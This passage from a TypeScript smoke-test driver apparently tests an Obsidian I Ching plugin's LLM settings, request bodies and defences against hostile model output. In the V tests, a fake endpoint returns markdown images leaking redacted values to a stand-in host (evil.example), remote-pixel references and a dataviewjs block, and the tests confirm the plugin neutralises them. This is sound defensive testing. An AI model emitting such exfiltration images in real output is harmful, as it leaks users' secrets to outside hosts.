    letzteDeutungLaenge = await cdp.evaluate<number>(`return Math.max((document.querySelector(".yijing-interpretation-body")?.textContent ?? "").trim().length, (document.querySelector(".okit-stream-tail")?.textContent ?? "").length);`);
    if (genugZeichen > 0) {
      await cdp.evaluate(`if (document.querySelector(".okit-stream-tail")) document.querySelector(".yijing-interpretation-inner .yijing-actions button")?.click(); return true;`);
    }
  }
  return Boolean(fertig);
}

/** M1b — der Fall, den M1 NICHT trifft (Cockpit-Task „Settings-Tab zeigt neu installierten LLM Endpoint Manager nicht sofort“):
 *  der Tab ist schon einmal gezeichnet und gecacht, DANACH installiert sich der Manager, und der Nutzer kommt von einem
 *  ANDEREN Tab zurueck. Schliessen und Wiederoeffnen (M1) reproduziert den Fehler nicht — `hide()` ruft dort `update()`;
 *  `openTab()` ruft `hide()` aber nur auf dem VERLASSENEN Tab, und `renderTab()` des neu aktiven zeichnet bei
 *  unveraenderter `settingItems.length` nicht neu (Kit `installTabRefreshOnOpen`, gemessen 1.14.2). */
async function pruefeTabWechsel(cdp: Cdp, port: number): Promise<void> {
  console.log("\nM1b · Manager erst nach dem gecachten Tab installiert, Rueckkehr per Tab-Wechsel");
  const name = "M1b Manager erst nach dem ersten Oeffnen des Tabs installiert: die Settings zeigen ihn nach einem Tab-Wechsel";
  let fake: FakeChatEndpoint | null = null;
  let ui: SettingsUi | null = null;
  try {
    await removeFakeManager(cdp);
    // Vorbedingung: Tab zeichnet die LOKALE Liste (ohne Manager) — sonst ist der Fall nicht hergestellt.
    ui = await openSettingsTab(cdp, port);
    if (!ui) { unmeasured(name, "Settings-Oberflaeche nicht gefunden"); return; }
    const vorher = await pollUntil<number>(ui.cdp, `const n = (${wurzelAusdruck(ui)}).querySelectorAll(".okit-ep-status").length; return n > 0 ? n : null;`, 6000, 250);
    if (!vorher) { unmeasured(name, "Vorbedingung nicht hergestellt: die lokale Endpunkt-Liste erschien nicht"); return; }

    // Auf einen anderen Tab wechseln (verlaesst unseren Tab: hide() laeuft dort), dann den Manager installieren.
    await cdp.evaluate(`app.setting.openTabById("appearance"); await new Promise((r) => setTimeout(r, 600)); return app.setting.activeTab?.id ?? null;`);
    fake = await startFakeChatEndpoint(MANAGER_DEFAULT_MODEL);
    await installFakeManager(cdp, fake.url);

    // Zurueck zu unserem Tab: der Host ruft nur renderTab() auf dem neu aktiven Tab.
    const aktiv = await cdp.evaluate<string | null>(`app.setting.openTabById(${JSON.stringify(PLUGIN_ID)}); await new Promise((r) => setTimeout(r, 800)); return app.setting.activeTab?.id ?? null;`);
    const body = (await pollUntil<string>(ui.cdp, `const t = (${wurzelAusdruck(ui)}).textContent || ""; return t.length > 200 && ${JSON.stringify(MANAGED_TEXT)}.some((m) => t.includes(m)) ? t : null;`, 6000, 250))
      ?? await ui.cdp.evaluate<string>(`return (${wurzelAusdruck(ui)}).textContent || "";`);
    const managed = MANAGED_TEXT.some((x) => body.includes(x));
    const lokal = await zeilenZahlSelector(ui, ".okit-ep-status");
    record(name, aktiv === PLUGIN_ID && managed && lokal === 0,
      `aktiver Tab ${JSON.stringify(aktiv)}, vorher ${vorher} lokale Zeile(n), jetzt managed-Text ${managed ? "da" : "fehlt"} und ${lokal} lokale Zeile(n)`);
  } catch (e) {
    if (!aufgezeichnet(name)) unmeasured(name, `Messung abgebrochen: ${(e as Error).message}`);
  } finally {
    if (ui) await closeSettings(cdp, ui);
    await removeFakeManager(cdp).catch(() => null);
    if (fake) await fake.close().catch(() => undefined);
  }
}

/** M1-M3 (+M2b): Manager an → Settings zeigen den Baustein statt der lokalen Liste, ein Lauf
 *  geht an den Manager-Endpunkt mit dem korrekten Modell; eine Modellwahl gegenueber dem
 *  Manager gewinnt gegen dessen Default (M2b, Regression aus lingotuner C1); Manager aus →
 *  beides faellt auf lokal zurueck. Ein einziger aeusserer try/finally raeumt Fake-Server und
 *  injizierte API auf, egal wo es abbricht. */
async function pruefeManager(cdp: Cdp, port: number): Promise<void> {
  console.log("\nM · LLM Endpoint Manager (optionale Fremd-Quelle)");
  let fake: FakeChatEndpoint | null = null;
  let localFake: FakeChatEndpoint | null = null;
  let ui: SettingsUi | null = null;
  let vorherEndpoints: unknown = null;
  const NAMEN = [
    "M1 Settings zeigen den Manager statt der lokalen Liste",
    "M2 Lauf nutzt den Manager-Endpunkt und das Default-Modell",
    "M2b Manager-Lauf nutzt gewaehltes Modell, nicht den Endpunkt-Default (C1)",
    "M3 Manager aus → lokale Liste in Settings und im Lauf",
  ];
  try {
    fake = await startFakeChatEndpoint(MANAGER_DEFAULT_MODEL);
    console.log(`  Fake-Manager-Endpunkt: ${fake.url}`);
    await installFakeManager(cdp, fake.url);

    // M1 — Settings zeigen den Manager-Baustein (managed-Text), keine .okit-ep-status-Zeile
    // (der Marker des lokalen Listen-Editors).
    ui = await openSettingsTab(cdp, port);
    if (!ui) { for (const n of NAMEN) unmeasured(n, "Settings-Oberflaeche nicht gefunden"); return; }
    // Erst warten, bis der Tab gezeichnet ist (das frische Fenster ist beim Anhaengen noch leer), und
    // dem Kit-Baustein Zeit fuer sein asynchrones Neuzeichnen nach der Aufloesung geben — gemessen wird
    // der Zustand danach, nicht der erste Anstrich.
    const body = (await pollUntil<string>(ui.cdp, `const t = (${wurzelAusdruck(ui)}).textContent || ""; return t.length > 200 && ${JSON.stringify(MANAGED_TEXT)}.some((m) => t.includes(m)) ? t : null;`, 6000, 250))
      ?? await ui.cdp.evaluate<string>(`return (${wurzelAusdruck(ui)}).textContent || "";`);
    const managed = MANAGED_TEXT.some((s) => body.includes(s));
    const localRows = await zeilenZahlSelector(ui, ".okit-ep-status");
    const auszug = managed ? "" : ` · Tab-Text rund um „KI“: ${JSON.stringify(body.slice(Math.max(0, body.search(/KI-Deutung|AI interpretation|LLM/i)), Math.max(0, body.search(/KI-Deutung|AI interpretation|LLM/i)) + 220))} (Laenge ${body.length})`;
    record(NAMEN[0]!, managed && localRows === 0, `managed-Text ${managed ? "da" : "fehlt"}, ${localRows} lokale Endpunkt-Zeilen${auszug}`);
    await closeSettings(cdp, ui);
    ui = null;

    // M2 — ein Lauf nutzt den Manager-Endpunkt und das Default-Modell (kein choice.model
    // gesetzt → modelOf() faellt auf defaultModel).
    const okM2 = await laufeDeutung(cdp);
    const callsM2 = fake.chatCalls();
    const modellM2 = fake.lastModel();
    record(NAMEN[1]!, okM2 && callsM2 > 0 && modellM2 === MANAGER_DEFAULT_MODEL,
      okM2 ? `Fake-Server sah ${callsM2} POST /v1/chat/completions, Modell ${JSON.stringify(modellM2)} (erwartet ${JSON.stringify(MANAGER_DEFAULT_MODEL)})`
           : "Deutungslauf lieferte kein Ergebnis");

    // M2b — Regression C1: eine im Panel/Settings getroffene Modellwahl (settings.llm.choice)
    // darf NICHT vom Endpunkt-Default ueberschrieben werden. resolveLlmEndpoint() liest
    // choice.model bereits mit hoechster Prioritaet (src/vendor/kit/endpoint-source.ts
    // modelOf()) — dieser Punkt beweist es gegen den Fake-Server, nicht nur am Code.
    const gewaehltesModell = `${MANAGER_DEFAULT_MODEL}-CHOICE`;
    await cdp.evaluate(`
      const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
      p.settings.llm.choice = { ...(p.settings.llm.choice ?? {}), model: ${JSON.stringify(gewaehltesModell)} };
      p.llm.invalidate(); await p.saveSettings();
      return { ok: true };
    `);
    const okM2b = await laufeDeutung(cdp);
    const modellM2b = fake.lastModel();
    record(NAMEN[2]!, okM2b && modellM2b === gewaehltesModell,
      okM2b ? `Fake-Server sah Modell ${JSON.stringify(modellM2b)}, erwartet ${JSON.stringify(gewaehltesModell)}`
            : "Deutungslauf lieferte kein Ergebnis");
    // choice zuruecksetzen: sonst liest M3s LOKALER Lauf denselben choice.model.
    await cdp.evaluate(`
      const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
      p.settings.llm.choice = {};
      p.llm.invalidate(); await p.saveSettings();
      return { ok: true };
    `);

    // M3 — Manager "deaktivieren" (Analog zu disablePlugin) → Settings fallen auf die lokale
    // Liste zurueck, ein Lauf nutzt wieder den lokalen Fake-Endpunkt (BRAUCHT einen echten
    // Server, sonst "nichts gemessen" statt still gruen).
    await removeFakeManager(cdp);
    ui = await openSettingsTab(cdp, port);
    if (!ui) { unmeasured(NAMEN[3]!, "Settings-Oberflaeche nach Manager-Entfernung nicht gefunden"); return; }
    const bodyNach = (await pollUntil<string>(ui.cdp, `const t = (${wurzelAusdruck(ui)}).textContent || ""; return t.length > 200 && !${JSON.stringify(MANAGED_TEXT)}.some((m) => t.includes(m)) ? t : null;`, 6000, 250))
      ?? await ui.cdp.evaluate<string>(`return (${wurzelAusdruck(ui)}).textContent || "";`);
    const managedNach = MANAGED_TEXT.some((s) => bodyNach.includes(s));
    const localRowsNach = await zeilenZahlSelector(ui, ".okit-ep-status");
    await closeSettings(cdp, ui);
    ui = null;
    const settingsZurueck = !managedNach && localRowsNach > 0;

    localFake = await startFakeChatEndpoint(LOCAL_FALLBACK_MODEL);
    console.log(`  Fake-Lokal-Endpunkt: ${localFake.url}`);
    vorherEndpoints = (await cdp.evaluate<{ eps: unknown }>(`return { eps: app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].settings.llm.endpoints };`)).eps;
    await cdp.evaluate(`
      const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
      p.settings.llm.endpoints = [{ url: ${JSON.stringify(localFake.url)} }];
      p.llm.invalidate(); await p.saveSettings();
      return { ok: true };
    `);
    const okLokal = await laufeDeutung(cdp);
    const lokaleCalls = localFake.chatCalls();
    const modellLokal = localFake.lastModel();
    record(NAMEN[3]!, settingsZurueck && okLokal && lokaleCalls > 0,
      `managed-Text ${managedNach ? "noch da" : "weg"}, ${localRowsNach} lokale Zeilen, lokaler Lauf ${okLokal ? "ok" : "fehlgeschlagen"} (${lokaleCalls} POST /v1/chat/completions, Modell ${JSON.stringify(modellLokal)})`);
  } catch (e) {
    for (const n of NAMEN) {
      if (!aufgezeichnet(n)) unmeasured(n, `Messung abgebrochen: ${(e as Error).message}`);
    }
  } finally {
    if (ui) await closeSettings(cdp, ui);
    await removeFakeManager(cdp).catch(() => null);
    if (fake) await fake.close().catch(() => undefined);
    if (localFake) await localFake.close().catch(() => undefined);
    if (vorherEndpoints !== null) {
      await cdp.evaluate(`
        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        p.settings.llm.endpoints = ${JSON.stringify(vorherEndpoints)};
        p.llm.invalidate(); await p.saveSettings();
        return { ok: true };
      `).catch(() => null);
    }
  }
}

/** N1-N6: Sampling-Profile (Modus creative, Abschnitt „Anfrage“). Gegen einen Fake-Endpunkt mit
 *  Qwen-Modellnamen (Familie wird aus dem Namen erkannt), lokaler Pfad ohne Manager. Die Werte
 *  stehen NICHT hier, sondern an der Quelle: Temperatur 0.7 und Denkstufe medium sind die
 *  Modus-Defaults aus `code-kit` sampling-profiles (MODES.creative) — der Body-Punkt N3 misst
 *  den tatsaechlich GESENDETEN Body, nicht die Anzeige. Zwei Bearbeitungen hintereinander (N2),
 *  weil ein Einklappen nach der ersten im Pilot nur so sichtbar wurde (Nachtrag 6). */
const ANFRAGE_MODELL = "qwen/qwen3.6-35b-a3b";

async function pruefeAnfrage(cdp: Cdp, port: number): Promise<void> {
  console.log("\nN · Sampling-Profile (Abschnitt „Anfrage“, Modus creative)");
  const NAMEN = [
    "N1 Abschnitt „Anfrage“ klappt auf und zeigt die Felder des Modus",
    "N2 Zwei Bearbeitungen hintereinander (Temperatur, Denkstufe) speichern und lassen den Abschnitt offen",
    "N3 Gesendeter Body traegt die Modus-Defaults (Temperatur 0.7, Denkstufe medium)",
    "N4 Gesendeter Body folgt den Einstellungen (Ueberschreibung 0.9, Denken aus → reasoning_effort none)",
    "N5 Zuruecksetzen entfernt die Ueberschreibung und laesst den Abschnitt offen",
    "N6 „Letzte Anfrage“ zeigt beim Oeffnen des Tabs den gesendeten Body",
  ];
  const P = `app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}]`;
  let fake: FakeChatEndpoint | null = null;
  let ui: SettingsUi | null = null;
  let vorher: unknown = null;
  try {
    await removeFakeManager(cdp);
    fake = await startFakeChatEndpoint(ANFRAGE_MODELL);
    console.log(`  Fake-Endpunkt: ${fake.url} (Modell ${ANFRAGE_MODELL})`);
    vorher = await cdp.evaluate(`const l = ${P}.settings.llm; return { eps: l.endpoints, choice: l.choice ?? null, request: ${P}.settings.request };`);
    await cdp.evaluate(`
      const p = ${P};
      p.settings.llm.endpoints = [{ url: ${JSON.stringify(fake.url)}, model: ${JSON.stringify(ANFRAGE_MODELL)} }]; p.settings.llm.choice = {};
      p.settings.request = { overrides: {}, thinking: {}, lastOnLevel: {}, levelPickerInChat: false };
      p.llm.invalidate(); await p.saveSettings();
      return true;`);

    // N3 — Lauf mit Modus-Defaults, Body am Fake-Server gemessen.
    const ok1 = await laufeDeutung(cdp);
    const body1 = fake.lastBody();
    record(NAMEN[2]!, ok1 && body1?.temperature === 0.7 && body1?.reasoning_effort === "medium",
      ok1 ? `Body: temperature=${JSON.stringify(body1?.temperature)}, reasoning_effort=${JSON.stringify(body1?.reasoning_effort)}, Modell ${JSON.stringify(body1?.model)}` : "Deutungslauf lieferte kein Ergebnis");

    // N1 — Tab oeffnen, Abschnitt aufklappen. `.okit-collapsible-header` ist hier die EINZIGE
    // einklappbare Sektion (die Einstellungs-Gruppen sind nicht einklappbar).
    ui = await openSettingsTab(cdp, port);
    if (!ui) { for (const n of NAMEN.filter((_, i) => i !== 2)) unmeasured(n, "Settings-Oberflaeche nicht gefunden"); return; }
    const w = wurzelAusdruck(ui);
    const vorKlick = await ui.cdp.evaluate<string | null>(`return (${w}).querySelector(".okit-collapsible-header")?.getAttribute("aria-expanded") ?? null;`);
    await ui.cdp.evaluate(`(${w}).querySelector(".okit-collapsible-header")?.click(); return true;`);
    const felder = await pollUntil<number>(ui.cdp, `const n = (${w}).querySelectorAll('.okit-collapsible-body input[data-field]').length; return n > 0 ? n : null;`, 4000, 200);
    const nachKlick = await ui.cdp.evaluate<string | null>(`return (${w}).querySelector(".okit-collapsible-header")?.getAttribute("aria-expanded") ?? null;`);
    record(NAMEN[0]!, vorKlick === "false" && nachKlick === "true" && (felder ?? 0) >= 2,
      `aria-expanded ${String(vorKlick)} → ${String(nachKlick)}, ${String(felder)} Eingabefelder`);

    // N6 — „Letzte Anfrage“ stammt aus dem Lauf N3 und steht beim Oeffnen schon da.
    const letzte = await ui.cdp.evaluate<string>(`return (${w}).querySelector(".okit-request-last")?.textContent ?? "";`);
    record(NAMEN[5]!, letzte.includes('"temperature": 0.7') && letzte.includes('"reasoning_effort": "medium"'),
      letzte ? `Anzeige: ${letzte.replace(/\s+/g, " ").slice(0, 120)}` : "kein .okit-request-last im Tab");

    // N2 — Bearbeitung 1: Temperatur 0.9 (Blur speichert), Bearbeitung 2: Denkstufe aus.
    await ui.cdp.evaluate(`
      const i = (${w}).querySelector('input[data-field="temperature"]');
      i.value = "0.9"; i.dispatchEvent(new Event("input", { bubbles: true })); i.dispatchEvent(new Event("blur"));
      return true;`);
    const ov = await pollUntil<boolean>(cdp, `return ${P}.settings.request.overrides?.creative?.["qwen3.6"]?.temperature === 0.9 ? true : null;`, 4000, 200);
    const offen1 = await pollUntil<string>(ui.cdp, `const a = (${w}).querySelector(".okit-collapsible-header")?.getAttribute("aria-expanded"); return a === "true" ? a : null;`, 2000, 200);
    await ui.cdp.evaluate(`
      const sel = [...(${w}).querySelectorAll(".okit-collapsible-body select")].find((s) => [...s.options].some((o) => o.value === "off"));
      sel.value = "off"; sel.dispatchEvent(new Event("change", { bubbles: true }));
      return true;`);
    const stufe = await pollUntil<boolean>(cdp, `return ${P}.settings.request.thinking?.creative === "off" ? true : null;`, 4000, 200);
    const offen2 = await pollUntil<string>(ui.cdp, `const a = (${w}).querySelector(".okit-collapsible-header")?.getAttribute("aria-expanded"); return a === "true" ? a : null;`, 2000, 200);
    record(NAMEN[1]!, ov === true && offen1 === "true" && stufe === true && offen2 === "true",
      `Ueberschreibung ${ov ? "gespeichert" : "fehlt"}, Stufe ${stufe ? "off" : "nicht gesetzt"}, Abschnitt nach Bearbeitung 1: ${String(offen1 ?? "zu")}, nach 2: ${String(offen2 ?? "zu")}`);
    await closeSettings(cdp, ui);
    ui = null;

    // N4 — zweiter Lauf: der Body folgt den Einstellungen.
    const ok2 = await laufeDeutung(cdp);
    const body2 = fake.lastBody();
    record(NAMEN[3]!, ok2 && body2?.temperature === 0.9 && body2?.reasoning_effort === "none",
      ok2 ? `Body: temperature=${JSON.stringify(body2?.temperature)}, reasoning_effort=${JSON.stringify(body2?.reasoning_effort)}` : "Deutungslauf lieferte kein Ergebnis");

    // N5 — Zuruecksetzen der Temperatur ueber den Knopf der Zeile.
    ui = await openSettingsTab(cdp, port);
    if (!ui) { unmeasured(NAMEN[4]!, "Settings-Oberflaeche nicht gefunden"); return; }
    const w2 = wurzelAusdruck(ui);
    await ui.cdp.evaluate(`
      const zeile = (${w2}).querySelector('input[data-field="temperature"]')?.closest(".setting-item");
      zeile?.querySelector(".extra-setting-button")?.click();
      return true;`);
    const weg = await pollUntil<boolean>(cdp, `const t = ${P}.settings.request.overrides?.creative?.["qwen3.6"]?.temperature; return t === undefined ? true : null;`, 4000, 200);
    const offen3 = await pollUntil<string>(ui.cdp, `const a = (${w2}).querySelector(".okit-collapsible-header")?.getAttribute("aria-expanded"); return a === "true" ? a : null;`, 2000, 200);
    record(NAMEN[4]!, weg === true && offen3 === "true", `Ueberschreibung ${weg ? "entfernt" : "noch da"}, Abschnitt ${offen3 === "true" ? "offen" : "zugeklappt"}`);
  } catch (e) {
    for (const n of NAMEN) if (!aufgezeichnet(n)) unmeasured(n, `Messung abgebrochen: ${(e as Error).message}`);
  } finally {
    if (ui) await closeSettings(cdp, ui);
    if (fake) await fake.close().catch(() => undefined);
    if (vorher !== null) {
      await cdp.evaluate(`
        const v = ${JSON.stringify(vorher)}; const p = ${P};
        p.settings.llm.endpoints = v.eps;
        if (v.choice === null) delete p.settings.llm.choice; else p.settings.llm.choice = v.choice;
        p.settings.request = v.request;
        p.llm.invalidate(); await p.saveSettings();
        return true;`).catch(() => null);
    }
  }
}

/** V1–V6: die Verbindung nach dem Tausch (Kit 0.51.2) — Schluessel je Zeile, Schwaerzung, Neutralisierung.
 *  Gegen einen Fake-Endpunkt, der den Request-Body aufzeichnet und das Platzhalter-Token aus der
 *  Anfrage in seine Antwort spiegelt (eine Bild-URL, ein dataviewjs-Block): so sieht der Treiber, was
 *  auf den Draht geht UND was der Renderer aus der Antwort macht. Lokaler Pfad ohne Manager. */
const SCHUTZ_MODELL = "qwen/qwen3.6-35b-a3b";
const V_GEHEIMNIS = "abcdefghijklmnop12345678";   // >= 16 Zeichen, sonst greift die Bearer-Regel nicht
const V_SK = "sk-abcdefghijklmnop1234";          // ohne Leerzeichen: steht als URL-Teil in einer Markdown-Bild-Syntax
const V_ZEILEN_SCHLUESSEL = "smoke-v5-schluessel";

async function pruefeSchutz(cdp: Cdp, aufraeumen: string[]): Promise<void> {
  console.log("\nV · Verbindung: Schluessel je Zeile, Schwaerzung, Neutralisierung");
  const NAMEN = [
    "V1 Zeile mit Klartext-Schluessel: nach resolve steht kein apiKey mehr in data.json, der Wert im Schluesselbund",
    "V2 Der Schluessel der Zeile geht als Bearer an den Endpunkt",
    "V3 Ein Geheimnis in der Frage geht als Platzhalter an den Draht, nicht im Klartext",
    "V4 Die Deutung zeigt das Original wieder (Schwaerzung ist umkehrbar)",
    "V5 Eine Antwort mit Bild-URL und Platzhalter erzeugt kein img-Element",
    "V6 Ein dataviewjs-Block in der Antwort rendert als Text, nicht als Codeblock",
    "V7 Die gespeicherte Notiz traegt die entschaerfte Form (```text statt ```dataviewjs und ```mermaid, kein Fernbild, auch nicht als Referenz-Definition), kein dataviewjs-Code im DOM",
    "V8 Die gespeicherte Notiz laedt das Fernbild nicht (Zaehler am Draht bleibt 0)",
    "V9 Zeile ohne Modell: das Panel nimmt das erste Modell der Liste und merkt es in der aktiven Zeile (setModel)",
  ];
  const P = `app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}]`;
  let fake: FakeChatEndpoint | null = null;
  let vorher: unknown = null;
  try {
    await removeFakeManager(cdp);
    fake = await startFakeChatEndpoint(SCHUTZ_MODELL, (body) => {
      // Jeden Platzhalter der Anfrage spiegeln — als Text, als Bild-URL (ein Bild je Platzhalter, damit die
      // Gegenprobe auch einen Platzhalter trifft, dessen Original keine Leerzeichen traegt) und als dataviewjs-Block.
      const platzhalter = [...JSON.stringify(body.messages).matchAll(/\[redacted-[a-z-]+-\d+\]/g)].map((m) => m[0]);
      const liste = platzhalter.length ? platzhalter : ["(kein Platzhalter gesehen)"];
      const pixel = fake ? `![p](${fake.url}/pixel?d=1)\n\n` : "";
      // Referenz-Definition mit Zeilenumbruch im Label und Mermaid-Bildform: beide lud die Regex-Schicht bis code-kit 0.19.1.
      const luecken = fake ? `![r][a b]\n\n[a\nb]: ${fake.url}/pixel?d=2\n\n\`\`\`mermaid\ngraph TD\n  A@{ img: "${fake.url}/pixel?d=3" }\n\`\`\`\n\n` : "";
      return `Echo ${liste.join(" ")}\n\n${pixel}${luecken}${liste.map((p) => `![x](https://evil.example/?d=${p})`).join("\n")}\n\n\`\`\`dataviewjs\ndv.paragraph("smoke")\n\`\`\`\n`;
    });
    console.log(`  Fake-Endpunkt: ${fake.url}`);
    vorher = await cdp.evaluate(`const l = ${P}.settings.llm; return { eps: l.endpoints, choice: l.choice ?? null, out: ${P}.settings.defaultOutput };`);
    // Ein Endpunkt MIT Klartext-Schluessel (ein Staging-Vault ohne Schluessel misst sonst nichts),
    // dann resolve({ force: true }) — erst das migriert in den Schluesselbund und speichert.
    await cdp.evaluate(`
      const p = ${P};
      p.settings.llm.endpoints = [{ url: ${JSON.stringify(fake.url)}, apiKey: ${JSON.stringify(V_ZEILEN_SCHLUESSEL)}, model: ${JSON.stringify(SCHUTZ_MODELL)} }];
      p.settings.llm.choice = {};
      p.llm.invalidate();
      await p.llm.resolve({ force: true });
      await new Promise((r) => setTimeout(r, 400));
      return true;`);
    const platte = JSON.parse((await readVaultFile(cdp, DATA_PATH)) ?? "{}") as { llm?: { endpoints?: Array<{ apiKey?: string; secretId?: string }> } };
    const zeile = platte.llm?.endpoints?.[0];
    const bund = await schluesselbund(cdp);
    const imBund = bund && zeile?.secretId ? bund[zeile.secretId] : undefined;
    record(NAMEN[0]!, bund ? zeile?.apiKey === undefined && (zeile?.secretId ?? "").startsWith(EP_SECRET_PREFIX) && imBund === V_ZEILEN_SCHLUESSEL : zeile?.apiKey === V_ZEILEN_SCHLUESSEL,
      bund ? `data.json: apiKey ${zeile?.apiKey === undefined ? "fehlt" : "ist noch da"}, secretId ${JSON.stringify(zeile?.secretId ?? null)}, Schluesselbund-Wert ${imBund === V_ZEILEN_SCHLUESSEL ? "stimmt" : "falsch/fehlt"}`
        : "kein Schluesselbund (< 1.11.4) — Wert bleibt in der Zeile");

    const frage = `Smoke V: Schluessel ${V_SK} und Authorization Bearer ${V_GEHEIMNIS} bitte pruefen`;
    const ok = await laufeDeutung(cdp, 20000, frage);
    const body = fake.lastBody();
    const draht = JSON.stringify(body?.messages ?? []);
    record(NAMEN[1]!, ok && fake.lastAuth() === `Bearer ${V_ZEILEN_SCHLUESSEL}`, `Authorization-Header am Fake-Server: ${JSON.stringify(fake.lastAuth())}`);
    record(NAMEN[2]!, ok && draht.includes("[redacted-token") && !draht.includes(V_GEHEIMNIS) && !draht.includes(V_SK),
      ok ? `Platzhalter im Body: ${draht.includes("[redacted-token") ? "ja" : "nein"}, Klartext-Geheimnis im Body: ${draht.includes(V_GEHEIMNIS) || draht.includes(V_SK) ? "JA" : "nein"}` : "Deutungslauf lieferte kein Ergebnis");

    const dom = await cdp.evaluate<{ text: string; imgs: number; evilImg: number; codeblock: number }>(`
      const b = document.querySelector(".yijing-interpretation-body");
      return { text: b?.textContent ?? "", imgs: b?.querySelectorAll("img").length ?? -1,
        evilImg: b?.querySelectorAll('img[src*="evil.example"], [src*="evil.example"]').length ?? -1,
        codeblock: b?.querySelectorAll('pre, code, [class*="dataviewjs"]').length ?? -1 };`);
    record(NAMEN[3]!, ok && dom.text.includes(V_GEHEIMNIS) && dom.text.includes(V_SK), ok ? `Deutung enthaelt beide Originale: ${dom.text.includes(V_GEHEIMNIS) && dom.text.includes(V_SK) ? "ja" : "nein"}` : "kein Ergebnis");
    record(NAMEN[4]!, ok && dom.imgs === 0 && dom.evilImg === 0, `img-Elemente: ${dom.imgs}, Elemente mit evil.example-Quelle: ${dom.evilImg}`);
    record(NAMEN[5]!, ok && dom.codeblock === 0 && dom.text.includes("dataviewjs"), `pre/code/dataviewjs-Elemente: ${dom.codeblock}, Text enthaelt „dataviewjs“: ${dom.text.includes("dataviewjs") ? "ja" : "nein"}`);

    // V7/V8: dieselbe Deutung speichern. Die Notiz oeffnet sich sofort (openAfterCreate), Live Preview laedt
    // Fernbilder schon vor der Leseansicht — deshalb misst V8 am Draht, nicht im DOM. Im Staging-Vault ist kein
    // Dataview installiert: V7 prueft die Form der Datei, nicht ein Nicht-Ausfuehren.
    const pixelVorher = fake.pixelCalls();
    const dateienVorher = await cdp.evaluate<string[]>(`return app.vault.getMarkdownFiles().map((f) => f.path);`);
    await cdp.evaluate(`${P}.settings.defaultOutput = "note"; ${P}.settings.openAfterCreate = true; return true;`);
    const gespeichert = ok && await clickPanelButton(cdp, ".yijing-interpretation-inner .yijing-actions button");
    await schlaf(3000);
    const dateienNachher = await cdp.evaluate<string[]>(`return app.vault.getMarkdownFiles().map((f) => f.path);`);
    const neu = dateienNachher.filter((f) => !dateienVorher.includes(f));
    for (const f of neu) aufraeumen.push(f);
    const notiz = neu.length === 1 ? await cdp.evaluate<string>(`return await app.vault.read(app.vault.getAbstractFileByPath(${JSON.stringify(neu[0])}));`) : "";
    const leaf = await cdp.evaluate<{ kopf: boolean; dvjs: number }>(`
      const v = document.querySelector(".workspace-leaf.mod-active .view-content");
      return { kopf: Boolean(v && /AI Interpretation|KI-Deutung/.test(v.textContent ?? "")), dvjs: v ? v.querySelectorAll("code.language-dataviewjs, .language-dataviewjs").length : -1 };`);
    const form = notiz.includes("```text") && !notiz.includes("```dataviewjs") && !notiz.includes("![") && !notiz.includes("```mermaid") && notiz.includes("[r]");
    record(NAMEN[6]!, gespeichert && neu.length === 1 && form && leaf.kopf && leaf.dvjs === 0,
      `neue Notizen: ${neu.length}, Fence text: ${notiz.includes("```text") ? "ja" : "nein"}, Fence dataviewjs in Datei: ${notiz.includes("```dataviewjs") ? "JA" : "nein"}, Fernbild-Syntax in Datei: ${notiz.includes("![") ? "JA" : "nein"}, Fence mermaid in Datei: ${notiz.includes("```mermaid") ? "JA" : "nein"}, Ueberschrift gerendert (Positivkontrolle): ${leaf.kopf ? "ja" : "nein"}, code.language-dataviewjs im DOM: ${leaf.dvjs}`);
    record(NAMEN[7]!, gespeichert && neu.length === 1 && leaf.kopf && pixelVorher === 0 && fake.pixelCalls() === 0,
      `GET /pixel am Fake-Server: ${pixelVorher} vor, ${fake.pixelCalls()} nach dem Speichern`);
    // V9 (Welle 17): eine Zeile ohne Modell. Das Panel nimmt das erste Modell der Liste und `setModel` schreibt es
    // in die AKTIVE Zeile — kein globales Feld mehr.
    await cdp.evaluate(`
      const p = ${P};
      p.settings.llm.endpoints = [{ url: ${JSON.stringify(fake.url)} }];
      p.settings.llm.choice = {};
      p.llm.invalidate(); await p.saveSettings();
      return true;`);
    const okV9 = await laufeDeutung(cdp, 20000, "Smoke V9: Zeile ohne Modell");
    const nachV9 = await cdp.evaluate<{ zeile: string | null; global: boolean }>(`
      const l = ${P}.settings.llm; return { zeile: l.endpoints[0]?.model ?? null, global: "model" in l };`);
    record(NAMEN[8]!, okV9 && nachV9.zeile === SCHUTZ_MODELL && !nachV9.global,
      okV9 ? `Modell der Zeile: ${JSON.stringify(nachV9.zeile)} (erwartet ${JSON.stringify(SCHUTZ_MODELL)}), globales Feld llm.model: ${nachV9.global ? "da" : "fehlt"}` : "Deutungslauf lieferte kein Ergebnis");
  } catch (e) {
    for (const n of NAMEN) if (!aufgezeichnet(n)) unmeasured(n, `Messung abgebrochen: ${(e as Error).message}`);
  } finally {
    if (fake) await fake.close().catch(() => undefined);
    if (vorher !== null) {
      await cdp.evaluate(`
        const v = ${JSON.stringify(vorher)}; const p = ${P};
        p.settings.llm.endpoints = v.eps; p.settings.defaultOutput = v.out;
        if (v.choice === null) delete p.settings.llm.choice; else p.settings.llm.choice = v.choice;
        p.llm.invalidate(); await p.saveSettings();
        return true;`).catch(() => null);
    }
  }
}

/** Ein bereits GELADENES Chat-Modell auf dem lokalen LM-Studio-Endpunkt, sonst `null`. Bewusst nur
 *  ein geladenes: eine Anfrage an ein nicht geladenes Modell loest ein JIT-Laden aus und
 *  verdraengt das Modell, an dem eine andere Sitzung gerade arbeitet. */
async function geladenesModell(url: string): Promise<string | null> {
  try {
    const res = await fetch(`${url}/api/v0/models`, { signal: AbortSignal.timeout(3000) });
    if (!res.ok) return null;
    const body = (await res.json()) as { data?: Array<{ id: string; state?: string; type?: string }> };
    return (body.data ?? []).find((m) => m.state === "loaded" && (m.type === "llm" || m.type === "vlm"))?.id ?? null;
  } catch {
    return null;
  }
}

/** M4: die Deutung gegen einen ECHTEN Endpunkt — der eigentliche Beleg des Kit-Chat-Clients
 *  (M2/M3 laufen gegen einen Fake-Server mit einem Chunk). Ohne geladenes Modell "nichts gemessen". */
async function pruefeEchtenEndpunkt(cdp: Cdp): Promise<void> {
  console.log("\nM4 · Deutung gegen einen echten Endpunkt");
